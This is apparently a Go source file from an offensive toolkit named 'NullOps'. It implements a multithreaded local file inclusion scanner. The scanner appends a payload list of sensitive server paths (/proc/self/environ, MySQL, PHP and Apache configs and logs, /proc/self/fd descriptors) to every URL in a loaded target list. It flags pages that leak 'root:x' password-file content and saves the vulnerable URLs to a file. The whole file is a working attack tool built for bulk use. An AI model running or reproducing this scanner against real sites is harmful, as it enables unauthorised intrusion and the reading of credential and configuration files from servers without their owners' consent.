package Scanners

import (
	"NullOps/CLI_Handlers"
	"NullOps/Helpers"
	"NullOps/Interface"
	"fmt"
	"regexp"
	"strconv"
	"time"
)

var payloadLFI = []string{
	"/proc/self/environ",
	"/etc/mysql/my.cnf",
	"/etc/my.cnf",
	"/etc/my.conf",
	"/etc/php.ini",
	"/etc/apache2/apache2.conf",
	"/etc/apache2/httpd.conf",
	"/etc/httpd/logs/access_log",
	"/etc/httpd/logs/access.log",
	"/etc/httpd/logs/error_log",
	"/etc/httpd/logs/error.log",
	"/etc/httpd/php.ini",
	"/proc/self/fd/0",
	"/proc/self/fd/1",
	"/proc/self/fd/2",
	"/proc/self/fd/3",
	"/proc/self/fd/4",
	"/proc/self/fd/5",
	"/proc/self/fd/6",
	"/proc/self/fd/7",
	"/proc/self/fd/8",
	"/proc/self/fd/9",
	"/proc/self/fd/10",
	"/proc/self/fd/11",
	"/proc/self/fd/12",
	"/proc/self/fd/13",
	"/proc/self/fd/14",
	"/proc/self/fd/15",
	"/proc/self/fd/16",
	"/proc/self/fd/17",
	"/proc/self/fd/18",
	"/proc/self/fd/19",
	"/proc/self/fd/20",
	"/proc/self/fd/21",
	"/proc/self/fd/22",
	"/proc/self/fd/23",
	"/proc/self/fd/24",
	"/proc/self/fd/25",
	"/proc/self/fd/26",
	"/proc/self/fd/27",
	"/proc/self/fd/28",
	"/proc/self/fd/29",
	"/proc/self/fd/30",
	"/proc/self/fd/31",
	"/proc/self/fd/32",
	"/proc/self/fd/33",
	"/proc/self/fd/34",
	"/proc/self/fd/35",
}

func scanLFI(config *Helpers.Runner) *Helpers.RunnerResult {
	for _, payload := range payloadLFI {
		Response, Error := Helpers.SendRequest(config.Line+payload, "GET", "", Helpers.RequestOptions{})
		mu.Lock()
		Helpers.PayloadsTested++
		mu.Unlock()

		if Error == nil {
			pattern := `root:x`
			re := regexp.MustCompile(pattern)
			matches := re.FindAllString(string(Response.Body), -1)

			if matches != nil {
				err := CLI_Handlers.AppendToFile(Helpers.OutputPath+"/LFI.txt", []string{config.Line + payload})
				CLI_Handlers.LogError(err)
				return &Helpers.RunnerResult{
					Line:   config.Line,
					Status: true,
					Error:  nil,
				}
			}
		}
	}

	return &Helpers.RunnerResult{
		Line:   config.Line,
		Status: false,
		Error:  fmt.Errorf("Invalid"),
	}
}

func ScannerLFI(config *Helpers.ScanConfig) {
	Helpers.Valid, Helpers.Invalid, Helpers.Checked, Helpers.PayloadsTested, Helpers.CPM, Helpers.HighestCPM, Helpers.Running = 0, 0, 0, 0, 0, 0, true

	FilePath := CLI_Handlers.GetFilePath()
	lines, err := CLI_Handlers.ReadLines(FilePath)
	CLI_Handlers.LogError(err)

	startTime := time.Now()
	go func() {
		for {
			if Helpers.Running {
				mu.Lock()
				tested := strconv.Itoa(Helpers.PayloadsTested)
				elapsedTime := time.Since(startTime)
				valid := Helpers.Valid + Helpers.Invalid
				Helpers.CPM = int(Helpers.CalculateCPM(valid, elapsedTime))
				Helpers.HighestCPM = Helpers.BestCPM(Helpers.CPM, Helpers.HighestCPM)
				mu.Unlock()

				Interface.StatsTitle(fmt.Sprintf("NullOps | Payloads Tested: %v | CPM: %v | Highest CPM: %v", tested, Helpers.CPM, Helpers.HighestCPM), Helpers.Valid, Helpers.Invalid, Helpers.Checked, len(lines))
				time.Sleep(1 * time.Second)
			} else {
				return
			}
		}
	}()

	defer func() {
		Helpers.Running = false
	}()

	Helpers.Threading(func(s string) {
		ScanConfig := Helpers.Runner{Line: s}
		RunnerResult := scanLFI(&ScanConfig)

		if RunnerResult.Error == nil {
			mu.Lock()
			Helpers.Valid++
			mu.Unlock()
			Interface.Option(config.Name, fmt.Sprintf("%v | Status: %v", RunnerResult.Line, RunnerResult.Status))
		} else {
			mu.Lock()
			Helpers.Invalid++
			mu.Unlock()
			if config.PrintInvalid {
				Interface.Option(config.Name, fmt.Sprintf("%v | Status: %v | Reason: %v", Helpers.ExtractDomain(RunnerResult.Line), RunnerResult.Status, RunnerResult.Error))
			}
		}
		mu.Lock()
		Helpers.Checked++
		mu.Unlock()
	}, config.Threads, lines)
}
